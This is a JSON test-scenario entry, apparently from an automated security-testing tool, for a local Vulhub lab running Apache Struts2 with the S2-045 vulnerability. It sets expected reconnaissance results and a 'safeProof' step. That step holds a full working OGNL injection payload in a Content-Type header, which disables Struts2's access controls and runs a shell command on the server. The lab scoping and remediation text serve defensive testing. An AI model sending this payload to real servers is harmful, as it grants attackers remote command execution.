    {
      "id": "vulhub-struts2-s2-045",
      "name": "Vulhub Apache Struts2 S2-045 local smoke",
      "labRoot": "labs/targets/vulhub/struts2/s2-045",
      "labPathHints": [
        "s2-045",
        "struts2/s2-045",
        "struts2\\s2-045"
      ],
      "target": {
        "defaultUrl": "http://127.0.0.1:8080/"
      },
      "expect": {
        "auth": {
          "login": "not_observed",
          "authState": "unknown",
          "authEndpointsEmpty": true
        },
        "normalizedApiIncludes": [
          {
            "method": "POST",
            "pathTemplate": "/doUpload.action",
            "absentRiskSignals": [
              "auth-surface"
            ]
          }
        ],
        "queueBeforeFirstFallbackFor": "authz-plan",
        "queueAfterAbsentTitles": [
          "Collect authenticated roles before business-impact testing"
        ],
        "control": {
          "stageIn": [
            "ready_for_business_planning",
            "needs_auth_contexts",
            "ready_for_validation_review"
          ],
          "minNormalizedApiEndpoints": 1,
          "decisionGuardIncludes": [
            "Prefer normalized API routes"
          ]
        },
        "operatingPicture": {
          "minEndpointMap": 1,
          "decisionFrameIncludes": [
            "not from a fixed phase list"
          ],
          "blockedIncludes": [
            "Cross-role"
          ],
          "allowedActionIncludes": [
            "normalized routes"
          ]
        }
      },
      "safeProof": {
        "kind": "commandOutput",
        "level": "shell",
        "activeApprovalRequired": true,
        "method": "POST",
        "path": "/doUpload.action",
        "command": "printf \"$(id)\"",
        "headers": {
          "Content-Type": "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='printf \"$(id)\"').(#cmds={'/bin/sh','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#out=@org.apache.commons.io.IOUtils@toString(#process.getInputStream(),'UTF-8')).(@org.apache.struts2.ServletActionContext@getResponse().addHeader('X-AegisProbe-Cmd',#out))}"
        },
        "expect": {
          "header": {
            "name": "X-AegisProbe-Cmd",
            "matches": "uid=\\d+\\("
          }
        },
        "finding": {
          "title": "Lab shell proof validated: Apache Struts2 S2-045 OGNL command execution",
          "severity": "critical",
          "description": "A scoped local-lab proof executed a controlled OS identity command through Struts2 OGNL and returned the output in an HTTP response header. The proof did not read files, write files, or open a reverse shell.",
          "remediation": "Upgrade Apache Struts2 to a fixed release and remove vulnerable file upload interceptor handling."
        }
      }
    },
